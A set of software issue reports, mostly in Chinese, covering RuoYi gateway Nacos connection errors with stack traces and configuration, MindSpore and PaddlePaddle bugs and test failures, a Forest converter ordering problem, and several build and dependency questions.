[Sentinel SpringCloudGateway] register SentinelGatewayFilter with order: -2147483648 ruoyi-gateway | 11:12:06.255 [main] INFO c.a.n.client.naming - [initNamespaceForNaming,63] - initializer namespace from System Property : null ruoyi-gateway | 11:12:06.256 [main] INFO c.a.n.client.naming - [call,69] - initializer namespace from System Environment :null ruoyi-gateway | 11:12:06.259 [main] INFO c.a.n.client.naming - [call,79] - initializer namespace from System Property :null ruoyi-gateway | 11:12:06.305 [main] INFO c.a.n.c.r.client - [lambda$createClient$0,77] - [RpcClientFactory] create a new rpc client of 0dc33f3f-551d-4679-b21f-be7f6ba1a8f5 ruoyi-gateway | 11:12:06.306 [main] INFO c.a.n.c.r.client - [printIfInfoEnabled,60] - [0dc33f3f-551d-4679-b21f-be7f6ba1a8f5]RpcClient init label, labels={module=naming, source=sdk} ruoyi-gateway | 11:12:06.312 [main] INFO c.a.n.c.r.client - [printIfInfoEnabled,60] - [0dc33f3f-551d-4679-b21f-be7f6ba1a8f5]RpcClient init, ServerListFactory =com.alibaba.nacos.client.naming.core.ServerListManager ruoyi-gateway | 11:12:06.315 [main] INFO c.a.n.c.r.client - [printIfInfoEnabled,60] - [0dc33f3f-551d-4679-b21f-be7f6ba1a8f5]Registry connection listener to current client:com.alibaba.nacos.client.naming.remote.gprc.redo.NamingGrpcRedoService ruoyi-gateway | 11:12:06.318 [main] INFO c.a.n.c.r.client - [printIfInfoEnabled,60] - [0dc33f3f-551d-4679-b21f-be7f6ba1a8f5]Register server push request handler:com.alibaba.nacos.client.naming.remote.gprc.NamingPushRequestHandler ruoyi-gateway | 11:12:06.321 [main] INFO c.a.n.c.r.client - [printIfInfoEnabled,60] - [0dc33f3f-551d-4679-b21f-be7f6ba1a8f5] Try to connect to server on start up, server: {serverIp='ruoyi-nacos', server main port=8848} ruoyi-gateway | 11:12:06.487 [main] INFO c.a.n.c.r.client - [printIfInfoEnabled,60] - [0dc33f3f-551d-4679-b21f-be7f6ba1a8f5] Success to connect to server [ruoyi-nacos:8848] on start up,connectionId=1639912326352_172.18.0.5_60766 ruoyi-gateway | 11:12:06.489 [com.alibaba.nacos.client.remote.worker] INFO c.a.n.c.r.client - [printIfInfoEnabled,60] - [0dc33f3f-551d-4679-b21f-be7f6ba1a8f5]Notify connected event to listeners. ruoyi-gateway | 11:12:06.488 [main] INFO c.a.n.c.r.client - [printIfInfoEnabled,60] - [0dc33f3f-551d-4679-b21f-be7f6ba1a8f5]Register server push request handler:com.alibaba.nacos.common.remote.client.RpcClient$ConnectResetRequestHandler ruoyi-gateway | 11:12:06.490 [com.alibaba.nacos.client.remote.worker] INFO c.a.n.client.naming - [onConnected,76] - Grpc connection connect ruoyi-gateway | 11:12:06.490 [main] INFO c.a.n.c.r.client - [printIfInfoEnabled,60] - [0dc33f3f-551d-4679-b21f-be7f6ba1a8f5]Register server push request handler:com.alibaba.nacos.common.remote.client.RpcClient$4 ruoyi-gateway | 11:12:07.098 [main] INFO c.a.c.s.g.s.SentinelSCGAutoConfiguration - [sentinelGatewayBlockExceptionHandler,134] - [Sentinel SpringCloudGateway] register SentinelGatewayBlockExceptionHandler ruoyi-gateway | 11:12:07.619 [main] WARN o.s.c.l.c.LoadBalancerCacheAutoConfiguration$LoadBalancerCaffeineWarnLogger - [logWarning,82] - Spring Cloud LoadBalancer is currently working with the default cache. You can switch to using Caffeine cache, by adding it and org.springframework.cache.caffeine.CaffeineCacheManager to the classpath. ruoyi-gateway | 11:12:07.764 [main] INFO c.a.n.c.c.i.ClientWorker - [addCacheDataIfAbsent,384] - [config_rpc_client] [subscribe] sentinel-ruoyi-gateway+DEFAULT_GROUP ruoyi-gateway | 11:12:07.785 [main] INFO c.a.n.c.c.i.CacheData - [addListener,173] - [config_rpc_client] [add-listener] ok, tenant=, dataId=sentinel-ruoyi-gateway, group=DEFAULT_GROUP, cnt=1 ruoyi-gateway | 11:12:07.786 [main] INFO c.a.n.c.r.client - [lambda$createClient$0,77] - [RpcClientFactory] create a new rpc client of 47e11a43-1b02-4ed6-9def-f86385a086d7_config-0 ruoyi-gateway | 11:12:07.787 [main] INFO c.a.n.c.r.client - [printIfInfoEnabled,60] - [47e11a43-1b02-4ed6-9def-f86385a086d7_config-0]RpcClient init label, labels={module=config, Vipserver-Tag=null, source=sdk, Amory-Tag=null, Location-Tag=null, taskId=0, AppName=unknown} ruoyi-gateway | 11:12:07.788 [main] INFO c.a.n.c.r.client - [printIfInfoEnabled,60] - [47e11a43-1b02-4ed6-9def-f86385a086d7_config-0]Register server push request handler:com.alibaba.nacos.client.config.impl.ClientWorker$ConfigRpcTransportClient$$Lambda$336/876213901 ruoyi-gateway | 11:12:07.789 [main] INFO c.a.n.c.r.client - [printIfInfoEnabled,60] - [47e11a43-1b02-4ed6-9def-f86385a086d7_config-0]Register server push request handler:com.alibaba.nacos.client.config.impl.ClientWorker$ConfigRpcTransportClient$$Lambda$337/230528013 ruoyi-gateway | 11:12:07.790 [main] INFO c.a.n.c.r.client - [printIfInfoEnabled,60] - [47e11a43-1b02-4ed6-9def-f86385a086d7_config-0]Registry connection listener to current client:com.alibaba.nacos.client.config.impl.ClientWorker$ConfigRpcTransportClient$1 ruoyi-gateway | 11:12:07.792 [main] INFO c.a.n.c.r.client - [printIfInfoEnabled,60] - [47e11a43-1b02-4ed6-9def-f86385a086d7_config-0]RpcClient init, ServerListFactory =com.alibaba.nacos.client.config.impl.ClientWorker$ConfigRpcTransportClient$2 ruoyi-gateway | 11:12:07.802 [main] INFO c.a.n.c.r.client - [printIfInfoEnabled,60] - [47e11a43-1b02-4ed6-9def-f86385a086d7_config-0] Try to connect to server on start up, server: {serverIp='127.0.0.1', server main port=8848} ruoyi-gateway | 11:12:07.837 [main] ERROR c.a.n.c.r.c.g.GrpcClient - [printIfErrorEnabled,99] - Server check fail, please check server 127.0.0.1 ,port 9848 is available , error ={} ruoyi-gateway | java.util.concurrent.ExecutionException: com.alibaba.nacos.shaded.io.grpc.StatusRuntimeException: UNAVAILABLE: io exception ruoyi-gateway | at com.alibaba.nacos.shaded.com.google.common.util.concurrent.AbstractFuture.getDoneValue(AbstractFuture.java:566) ruoyi-gateway | at com.alibaba.nacos.shaded.com.google.common.util.concurrent.AbstractFuture.get(AbstractFuture.java:445) ruoyi-gateway | at com.alibaba.nacos.common.remote.client.grpc.GrpcClient.serverCheck(GrpcClient.java:146) ruoyi-gateway | at com.alibaba.nacos.common.remote.client.grpc.GrpcClient.connectToServer(GrpcClient.java:268) ruoyi-gateway | at com.alibaba.nacos.common.remote.client.RpcClient.start(RpcClient.java:394) ruoyi-gateway | at com.alibaba.nacos.client.config.impl.ClientWorker$ConfigRpcTransportClient.ensureRpcClient(ClientWorker.java:941) ruoyi-gateway | at com.alibaba.nacos.client.config.impl.ClientWorker$ConfigRpcTransportClient.getOneRunningClient(ClientWorker.java:1104) ruoyi-gateway | at com.alibaba.nacos.client.config.impl.ClientWorker$ConfigRpcTransportClient.queryConfig(ClientWorker.java:996) ruoyi-gateway | at com.alibaba.nacos.client.config.impl.ClientWorker.getServerConfig(ClientWorker.java:407) ruoyi-gateway | at com.alibaba.nacos.client.config.NacosConfigService.getConfigInner(NacosConfigService.java:166) ruoyi-gateway | at com.alibaba.nacos.client.config.NacosConfigService.getConfig(NacosConfigService.java:94) ruoyi-gateway | at com.alibaba.csp.sentinel.datasource.nacos.NacosDataSource.readSource(NacosDataSource.java:141) ruoyi-gateway | at com.alibaba.csp.sentinel.datasource.nacos.NacosDataSource.readSource(NacosDataSource.java:42) ruoyi-gateway | at com.alibaba.csp.sentinel.datasource.AbstractDataSource.loadConfig(AbstractDataSource.java:44) ruoyi-gateway | at com.alibaba.csp.sentinel.datasource.nacos.NacosDataSource.loadInitialConfig(NacosDataSource.java:115) ruoyi-gateway | at com.alibaba.csp.sentinel.datasource.nacos.NacosDataSource.&lt;init&gt;(NacosDataSource.java:110) ruoyi-gateway | at com.alibaba.cloud.sentinel.datasource.factorybean.NacosDataSourceFactoryBean.getObject(NacosDataSourceFactoryBean.java:76) ruoyi-gateway | at com.alibaba.cloud.sentinel.datasource.factorybean.NacosDataSourceFactoryBean.getObject(NacosDataSourceFactoryBean.java:34) ruoyi-gateway | at org.springframework.beans.factory.support.FactoryBeanRegistrySupport.doGetObjectFromFactoryBean(FactoryBeanRegistrySupport.java:169) ruoyi-gateway | at org.springframework.beans.factory.support.FactoryBeanRegistrySupport.getObjectFromFactoryBean(FactoryBeanRegistrySupport.java:101) ruoyi-gateway | at org.springframework.beans.factory.support.AbstractBeanFactory.getObjectForBeanInstance(AbstractBeanFactory.java:1884) ruoyi-gateway | at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.getObjectForBeanInstance(AbstractAutowireCapableBeanFactory.java:1284) ruoyi-gateway | at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:345) ruoyi-gateway | at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) ruoyi-gateway | at com.alibaba.cloud.sentinel.custom.SentinelDataSourceHandler.registerBean(SentinelDataSourceHandler.java:203) ruoyi-gateway | at com.alibaba.cloud.sentinel.custom.SentinelDataSourceHandler.lambda$afterSingletonsInstantiated$0(SentinelDataSourceHandler.java:93) ruoyi-gateway | at java.util.TreeMap.forEach(TreeMap.java:1005) ruoyi-gateway | at com.alibaba.cloud.sentinel.custom.SentinelDataSourceHandler.afterSingletonsInstantiated(SentinelDataSourceHandler.java:80) ruoyi-gateway | at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:963) ruoyi-gateway | at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:918) ruoyi-gateway | at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:583) ruoyi-gateway | at org.springframework.boot.web.reactive.context.ReactiveWebServerApplicationContext.refresh(ReactiveWebServerApplicationContext.java:64) ruoyi-gateway | at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:754) ruoyi-gateway | at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:434) ruoyi-gateway | at org.springframework.boot.SpringApplication.run(SpringApplication.java:338) ruoyi-gateway | at org.springframework.boot.SpringApplication.run(SpringApplication.java:1343) ruoyi-gateway | at org.springframework.boot.SpringApplication.run(SpringApplication.java:1332) ruoyi-gateway | at com.ruoyi.gateway.RuoYiGatewayApplication.main(RuoYiGatewayApplication.java:17) ruoyi-gateway | at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ruoyi-gateway | at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ruoyi-gateway | at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ruoyi-gateway | at java.lang.reflect.Method.invoke(Method.java:498) ruoyi-gateway | at org.springframework.boot.loader.MainMethodRunner.run(MainMethodRunner.java:49) ruoyi-gateway | at org.springframework.boot.loader.Launcher.launch(Launcher.java:108) ruoyi-gateway | at org.springframework.boot.loader.Launcher.launch(Launcher.java:58) ruoyi-gateway | at org.springframework.boot.loader.JarLauncher.main(JarLauncher.java:88) ruoyi-gateway | Caused by: com.alibaba.nacos.shaded.io.grpc.StatusRuntimeException: UNAVAILABLE: io exception ruoyi-gateway | at com.alibaba.nacos.shaded.io.grpc.Status.asRuntimeException(Status.java:533) ruoyi-gateway | at com.alibaba.nacos.shaded.io.grpc.stub.ClientCalls$UnaryStreamToFuture.onClose(ClientCalls.java:490) ruoyi-gateway | at com.alibaba.nacos.shaded.io.grpc.PartialForwardingClientCallListener.onClose(PartialForwardingClientCallListener.java:39) ruoyi-gateway | at com.alibaba.nacos.shaded.io.grpc.ForwardingClientCallListener.onClose(ForwardingClientCallListener.java:23) ruoyi-gateway | at com.alibaba.nacos.shaded.io.grpc.ForwardingClientCallListener$SimpleForwardingClientCallListener.onClose(ForwardingClientCallListener.java:40) ruoyi-gateway | at com.alibaba.nacos.shaded.io.grpc.internal.CensusStatsModule$StatsClientInterceptor$1$1.onClose(CensusStatsModule.java:700) ruoyi-gateway | at com.alibaba.nacos.shaded.io.grpc.PartialForwardingClientCallListener.onClose(PartialForwardingClientCallListener.java:39) ruoyi-gateway | at com.alibaba.nacos.shaded.io.grpc.ForwardingClientCallListener.onClose(ForwardingClientCallListener.java:23) ruoyi-gateway | at com.alibaba.nacos.shaded.io.grpc.ForwardingClientCallListener$SimpleForwardingClientCallListener.onClose(ForwardingClientCallListener.java:40) ruoyi-gateway | at com.alibaba.nacos.shaded.io.grpc.internal.CensusTracingModule$TracingClientInterceptor$1$1.onClose(CensusTracingModule.java:399) ruoyi-gateway | at com.alibaba.nacos.shaded.io.grpc.internal.ClientCallImpl.closeObserver(ClientCallImpl.java:510) ruoyi-gateway | at com.alibaba.nacos.shaded.io.grpc.internal.ClientCallImpl.access$300(ClientCallImpl.java:66) ruoyi-gateway | at com.alibaba.nacos.shaded.io.grpc.internal.ClientCallImpl$ClientStreamListenerImpl.close(ClientCallImpl.java:630) ruoyi-gateway | at com.alibaba.nacos.shaded.io.grpc.internal.ClientCallImpl$ClientStreamListenerImpl.access$700(ClientCallImpl.java:518) ruoyi-gateway | at com.alibaba.nacos.shaded.io.grpc.internal.ClientCallImpl$ClientStreamListenerImpl$1StreamClosed.runInternal(ClientCallImpl.java:692) ruoyi-gateway | at com.alibaba.nacos.shaded.io.grpc.internal.ClientCallImpl$ClientStreamListenerImpl$1StreamClosed.runInContext(ClientCallImpl.java:681) ruoyi-gateway | at com.alibaba.nacos.shaded.io.grpc.internal.ContextRunnable.run(ContextRunnable.java:37) ruoyi-gateway | at com.alibaba.nacos.shaded.io.grpc.internal.SerializingExecutor.run(SerializingExecutor.java:123) ruoyi-gateway | at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) ruoyi-gateway | at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) ruoyi-gateway | at java.lang.Thread.run(Thread.java:748) ruoyi-gateway | Caused by: com.alibaba.nacos.shaded.io.grpc.netty.shaded.io.netty.channel.AbstractChannel$AnnotatedConnectException: Connection refused: /127.0.0.1:9848 ruoyi-gateway | Caused by: java.net.ConnectException: Connection refused ruoyi-gateway | at sun.nio.ch.SocketChannelImpl.checkConnect(Native Method) ruoyi-gateway | at sun.nio.ch.SocketChannelImpl.finishConnect(SocketChannelImpl.java:716) ruoyi-gateway | at com.alibaba.nacos.shaded.io.grpc.netty.shaded.io.netty.channel.socket.nio.NioSocketChannel.doFinishConnect(NioSocketChannel.java:327) ruoyi-gateway | at com.alibaba.nacos.shaded.io.grpc.netty.shaded.io.netty.channel.nio.AbstractNioChannel$AbstractNioUnsafe.finishConnect(AbstractNioChannel.java:336) ruoyi-gateway | at com.alibaba.nacos.shaded.io.grpc.netty.shaded.io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:685) ruoyi-gateway | at com.alibaba.nacos.shaded.io.grpc.netty.shaded.io.netty.channel.nio.NioEventLoop.processSelectedKeysOptimized(NioEventLoop.java:632) ruoyi-gateway | at com.alibaba.nacos.shaded.io.grpc.netty.shaded.io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:549) ruoyi-gateway | at com.alibaba.nacos.shaded.io.grpc.netty.shaded.io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:511) ruoyi-gateway | at com.alibaba.nacos.shaded.io.grpc.netty.shaded.io.netty.util.concurrent.SingleThreadEventExecutor$5.run(SingleThreadEventExecutor.java:918) ruoyi-gateway | at com.alibaba.nacos.shaded.io.grpc.netty.shaded.io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74) ruoyi-gateway | at com.alibaba.nacos.shaded.io.grpc.netty.shaded.io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30) ruoyi-gateway | at java.lang.Thread.run(Thread.java:748) # Tomcat server: port: 8080 # Spring spring: application: # 应用名称 name: ruoyi-gateway profiles: # 环境配置 active: dev main: allow-bean-definition-overriding: true cloud: nacos: discovery: # 服务注册地址 server-addr: ruoyi-nacos:8848 config: # 配置中心地址 server-addr: ruoyi-nacos:8848 # 配置文件格式 file-extension: yml # 共享配置 shared-configs: - application-${spring.profiles.active}.${spring.cloud.nacos.config.file-extension} sentinel: # 取消控制台懒加载 eager: true transport: # 控制台地址 dashboard: 127.0.0.1:8718 # nacos配置持久化 datasource: ds1: nacos: server-addr: ruoyi-nacos:8848 dataId: sentinel-ruoyi-gateway groupId: DEFAULT_GROUP data-type: json rule-type: flow"
[CT][MS][SparseMatrixNNZ] 执行 SparseMatrixNNZ 性能测试用例，提示：FileNotFoundError: [Errno 2] No such file or directory,"1， 执行 SparseMatrixNNZ 性能测试用例，提示缺失文件。 给的资料中已说明，标杆TensorFlow友商算子未使用GPU，与CPU对标通过，查看资料中截图，性能用例也是通过的。 但这边直接运行交付件中的用例，不通。 标杆GPU没有，那就与标杆CPU对比即可。 / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph   <code>: def test_sparsematrixnnz_317_317_performance(): input = gen_test_case_data(np.int32, np.int64, (317, 317), -100, 100) fact = SparseMatrixNNZMock(inputs=[input]) &gt; fact.forward_profile_cmp() test_profiling_sparsematrixnnz.py:16: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/sparse_matrix_nnz_ops.py:154: in forward_profile_cmp forward_profile_ms = self.mindspore_profile(net, run_time, op_name, *inputs) ../share/meta.py:179: in mindspore_profile profiler_ms.analyse() /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/profiler/profiling.py:319: in analyse self._gpu_analyse() /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/profiler/profiling.py:885: in _gpu_analyse reduce_op_type = self._get_step_reduce_op_type() _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.profiler.profiling.Profiler object at 0x7fbdb8f7fd90&gt; def _get_step_reduce_op_type(self): """"""Gets all communication operator names."""""" step_trace_original_filename = f'step_trace_profiling_{self._dev_id}.txt' step_trace_file_path = os.path.join(self._output_path, step_trace_original_filename) step_trace_file_path = validate_and_normalize_path(step_trace_file_path) reduce_op_type = [] &gt; with open(step_trace_file_path, 'r') as f_obj: E FileNotFoundError: [Errno 2] No such file or directory: '/home/zhangxuebao/aaaaaaaaaaa/profiling_test/data/profiler/step_trace_profiling_0.txt'"
声明的接口返回类型如果是String（或其他Charsequencel类型）导致自定义converter失效,"Forest: version 1.5.25 Backend: 默认 该问题是如何引起的？ 接口声明返回类型String 源码 ResultHandler 判断顺序没有优先使用自定义converter。 106行： 而自定义converter在114行才开始： 报错信息/完整请求日志（如果没有请求日志请把开关打开） 接口定义（必要时请提供） ResultHandler   <code>: response.setContent(responseText); if (CharSequence.class.isAssignableFrom(resultClass)) { return responseText; } if (request.getDecoder() != null) { if (contentType != null &amp;&amp; contentType.canReadAsString()) { return request.getDecoder().convertToJavaObject(responseText, resultType); } else { return request.getDecoder().convertToJavaObject(response.getByteArray(), resultType); } } ForestDataType dataType = request.getDataType(); ForestConverter converter = request.getConfiguration().getConverter(dataType); if (contentType != null &amp;&amp; contentType.canReadAsString()) { return converter.convertToJavaObject(responseText, resultType); }"
生成对抗样本，梯度不更新，报错AttributeError: 'Tensor' object has no attribute 'trainable',"环境：paddlepaddle2.0 我想要更新图像数据的梯度， img = paddle.to_tensor(img, dtype='float32', place=paddle.CUDAPlace(0), stop_gradient=False) model = paddle.vision.models.vgg16(pretrained=True) predict = model(img)[0] print (predict.shape) label = np.argmax(predict) for param in model.parameters(): param.stop_gradient = True #optimizer = torch.optim.Adam([img]) optimizer = paddle.optimizer.Adam(learning_rate=0.001, parameters=img) epochs=100 target=288 target = paddle.to_tensor(target, dtype='int64',place=paddle.CUDAPlace(0)) for epoch in range(epochs): # forward + backward output = model(img) 运行报错：不确定是优化器的parameters参数设置有问题，还是用paddle.to_tensor创建的img有问题。麻烦帮忙看下，怎么才能更新到img。   <code>: loss = F.cross_entropy(output, target) label = np.argmax(output[0]) #print(""label={}"".format(label)) print(""epoch={} loss={} label={}"".format(epoch,loss,label)) #如果定向攻击成功 if label == target: break loss.backward() optimizer.step() optimizer.clear_grad()"
paddle.fluid.layers.scale bug,"复现代码如下。虽然和qingqing沟通可以绕过，但还是希望这个要当作bug解决。   <code>: def testscale(): x = fluid.layers.data(name='x', shape=[1], dtype='float32') y = x * 2 z = paddle.fluid.layers.scale(x, 2) place = fluid.CPUPlace() exe = fluid.Executor(place) exe.run(fluid.default_startup_program()) inputdata = np.array([1],np.float32) output = exe.run( fluid.default_main_program(), feed={'x': inputdata}, fetch_list=[x.name, y.name, z.name] ) #should output 1,2,2 ; but it output 1,2,1 print output"
依赖下不了,这个依赖用我用了osc的私服下不下来，请问你们用的什么呢？ 还有公司服务器上面java都是1.7，现在看到1.8的代码我都有一股淡淡的忧伤。   <code>: &lt;dependency&gt; &lt;groupId&gt;org.hyperic&lt;/groupId&gt; &lt;artifactId&gt;sigar&lt;/artifactId&gt; &lt;version&gt;1.6.5.132&lt;/version&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt;
Remove main_program ,We can use to switch program. The and are not necessary.   <code>: program_guard() main_program startup_program
"[CT][MS][generate]multi return , type join fail","控制流网络，多个return，报错Type join / 硬件环境: /device ascend/GPU/CPU : -- MindSpore version :d824f2ae, master -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph python test_monad29.py pass Traceback (most recent call last): File ""test_monad29.py"", line 70, in out = net(Tensor(x), Tensor(y)) File ""/root/miniconda3/envs/ctj/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 574, in call out = self.compile_and_run(*args) File ""/root/miniconda3/envs/ctj/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 957, in compile_and_run self.compile(*inputs) File ""/root/miniconda3/envs/ctj/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 930, in compile jit_config_dict=self._jit_config_dict) File ""/root/miniconda3/envs/ctj/lib/python3.7/site-packages/mindspore/common/api.py"", line 1084, in compile result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) TypeError: Cannot join the return values of different branches, perhaps you need to make them equal. Type Join Failed: Abstract type AbstractRefTensor cannot join with AbstractTuple. For more details, please refer to https://www.mindspore.cn/search?inputValue=Type%20Join%20Failed Inner Message: The abstract type of the return value of the current branch is AbstractTuple{element[0]: AbstractTensor(shape: (1), element: AbstractScalar(Type: Float32, Value: AnyValue, Shape: NoShape), value_ptr: 0x5616c46adad0, value: AnyValue), element[1]: AbstractTensor(shape: (1), element: AbstractScalar(Type: Float32, Value: AnyValue, Shape: NoShape), value_ptr: 0x5616c46adad0, value: AnyValue), sequence_nodes: {↓?construct.21:[CNode]22{[0]: ValueNode MakeTuple, [1]: Φx, [2]: Φy}, elements_use_flags: {ptr: 0x7f4948003440, value: [const vector][0, 0]}}}, and that of the previous branch is AbstractRefTensor(key: weight ref_value: AbstractRefTensor(shape: (1), element: AbstractScalar(Type: Float32, Value: AnyValue, Shape: NoShape), value_ptr: 0x5616c46adad0, value: AnyValue), value: AnyValue). The node is ???construct.23:[CNode]24{[0]: ???construct.23:[CNode]25{[0]: ValueNode Switch, [1]: [CNode]45, [2]: ValueNode ???construct.19, [3]: ValueNode ↓??construct.20}}, true branch: ???construct.19, false branch: ↓??construct.20 '---------------------------------------------------- '- The Traceback of Net Construct Code: '---------------------------------------------------- The function call stack (See file '/home/ctj/generate/rank_0/om/analyze_fail.dat' for more details. Get instructions about at https://www.mindspore.cn/search?inputValue=analyze_fail.dat): '# 0 In file test_monad29.py(29) if (x &lt; self.b): '# 1 In file test_monad29.py(34) elif (self.w != self.b): ^ '# 2 In file test_monad29.py(35) while (y &gt;= self.b): ^ '---------------------------------------------------- '- C++ Call Stack: (For framework developers) '---------------------------------------------------- mindspore/ccsrc/pipeline/jit/static_analysis/static_analysis.cc:780 ProcessEvalResults   <code>: from mindspore.nn import Cell, GraphCell from mindspore.common import Tensor, dtype, Parameter from mindspore.train.serialization import export, load import mindspore.ops.operations as P import mindspore.ops.functional as F import numpy as np def test(x): for g in range(2): x = (x * g) x = (x * x) if (x == 1): continue return x class Net(Cell): def __init__(self): super().__init__() self.w = Parameter(Tensor([2], dtype.float32), name='weight') self.b = Parameter(Tensor([1], dtype.float32), name='bias') def construct(self, x, y): if (x &lt; self.b): y = (self.b / test(x)) x = (y + self.w) while (x &gt;= self.w): return self.b elif (self.w != self.b): while (y &gt;= self.b): return self.w elif (self.b &gt; y): self.b = (x - self.w) else: self.w = (y / y) return (x + y) x = np.array([1], np.float32) y = np.array([3], np.float32) net = Net() out = net(Tensor(x), Tensor(y)) print('ms forward: ', out) net1 = Net() grad_net = F.grad(net1, grad_position=(0, 1)) fgrad = grad_net(Tensor(x), Tensor(y)) print('ms backward: ', fgrad) net2 = Net() grad_net1 = F.grad(net2, grad_position=(0, 1)) sgrad_net = F.grad(grad_net1) sgrad = sgrad_net(Tensor(x), Tensor(y)) print('second grad: ', sgrad) analyze_fail.dat"
搜索条件字段,"在crud中，会有一些特殊字段，仅作为查询条件，不用于增删改 比如 时间范围查询 金额范围查询 通过该字段的类型选择后端 条件适用哪个字段 建议给columns加一个属性，用于指定该字段为查询条件，我现在是通过隐藏的形式处理的   <code>: { label: '余额', prop: 'balanceRange', search: true, searchslot: true, addDisplay: false, editDisplay: false, viewDisplay: false, showColumn: false, hide: true, }"
在Transformer网络中增加summary算子，在图编译阶段会被优化,": /device gpu /device cpu /device ascend mindspore 1.1 版本 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : 复现步骤： 使用model zoo中的transformer网络 在transformer 网络中的transformer_for_train.py文件，使用summary算子 model_zoo/official/nlp/transformer/src/transformer_for_train.py 在 的 construt 中的grad后面使用summary算子， 会出现summary算子无法收集数据，同时使用MindInsight中的计算图功能，发现没有Summary算子 train.py的脚步中 args.enable_lossscale == ""true""   <code>: TransformerTrainOneStepWithLossScaleCell"
Remove unused libwarpctc.so link in core.so and libpaddle_fluid.so,"related https://github.com/PaddlePaddle/Paddle/pull/7572#pullrequestreview-90049697 Now both core.so and libpaddle_fluid.so have the link to libwarpctc.so: It will cause following error when use libpaddle_fluid.so However, as libwarpctc.so is dynamic loaded, it should not be linked into core.so and libpaddle_fluid.so.   <code>: $ ldd core.so linux-vdso.so.1 =&gt; (0x00007ffeab6c5000) libpthread.so.0 =&gt; /lib64/libpthread.so.0 (0x00007f49d87aa000) libpython2.7.so.1.0 =&gt; /home/luotao02/.jumbo/lib/libpython2.7.so.1.0 (0x00007f49d83ec000) librt.so.1 =&gt; /lib64/librt.so.1 (0x00007f49d81e4000) libwarpctc.so =&gt; /home/luotao02/.jumbo/lib/libwarpctc.so (0x00007f49d7fdf000) ... $ldd /home/luotao02/PaddleRoot/lib/libpaddle_fluid.so linux-vdso.so.1 =&gt; (0x00007ffd6e6e5000) libpthread.so.0 =&gt; /lib64/libpthread.so.0 (0x00007fbc314e6000) libwarpctc.so =&gt; /home/luotao02/.jumbo/lib/libwarpctc.so (0x00007fbc312e2000) ... $ ../run.sh ./example: error while loading shared libraries: libwarpctc.so: cannot open shared object file: No such file or directory"
[ST][MS][Comiler]报错解决地图190631根因分析和定位说明需要补充,"https://bbs.huaweicloud.com/forum/thread-190631-1-1.html 1.原因分析中，希望补充 如何定位到具体是哪个算子的——添加详细定位链接介绍 2.self.grad_wrt_output需要修改成正向网络输出的shape一致，希望补充描述如何得出正向网络输出 3.修改点：解决办法中 ： 一直的 ---&gt; 一致的 Hardware Environment（) / 硬件环境: /device ascend等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_usability_specifications_website_tutorial_accurate_001 浏览器打开 https://bbs.huaweicloud.com/forum/thread-190631-1-1.html 根因分析和定位说明需要补充 责任人 廉立光   <code>: 参考analyze_fail.dat文件分析指导，可知是第一个红框的MatMul在infer shape时报错。然后再看第二个红框，该算子的第一个输入的shape为(2, 3)，第二个输入的shape为(1, 3)，跟报错信息吻合（注意这里MatMul的transpose_a属性为True）。最后我们看第三个红框，该MatMul是在grad_math_ops.py文件中的253行被调用的，是MatMul算子的反向传播规则生成的算子，MatMul算子的反向传播规则如下所示："
